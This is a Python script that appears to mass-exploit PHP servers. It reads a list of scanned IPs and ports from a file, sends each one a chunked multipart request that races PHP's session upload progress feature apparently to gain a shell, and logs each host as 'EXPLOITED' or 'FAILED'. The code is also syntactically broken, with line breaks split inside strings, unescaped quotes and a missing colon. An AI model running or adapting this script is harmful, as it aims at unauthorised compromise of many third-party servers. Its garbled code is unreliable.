import socket
import time
import json
import sys

def trigger_php2shell(target_host, target_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target_host, target_port))
        
        boundary = "----Boundary"
        headers = (
            f"POST / HTTP/1.1
"
            f"Host: {target_host}
"
            f"Content-Type: multipart/form-data; boundary={boundary}
"
            f"Transfer-Encoding: chunked
"
            f"Connection: keep-alive

"
        )
        s.send(headers.encode())
        
        payload1 = f"--{boundary}
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

{'A'*1024}
"
        payload1 += f"--{boundary}
Content-Disposition: form-data; name="file"; filename="x.txt"
Content-Type: text/plain

"
        s.send(f"{len(payload1):X}
".encode() + payload1.encode() + b"
")
        
        time.sleep(1.5)
        
        payload2 = "B" * 4096
        s.send(f"{len(payload2):X}
".encode() + payload2.encode() + b"
")
        
        s.send(b"0

")
        s.close()
        return True
    except Exception as e:
        return False

if __name__ == "__main__"
    # Read candidates from file
    with open('hits.json') as f:
        hits = json.load(f)
    
    results = []
    for hit in hits:
        ip = hit.get('ip')
        for port_info in hit.get('ports', []):
            port = port_info.get('port')
            if trigger_php2shell(ip, port):
                results.append(f"{ip}:{port} - EXPLOITED")
            else:
                results.append(f"{ip}:{port} - FAILED")
    
    with open('results.txt', 'w') as f:
        f.write('
'.join(results))
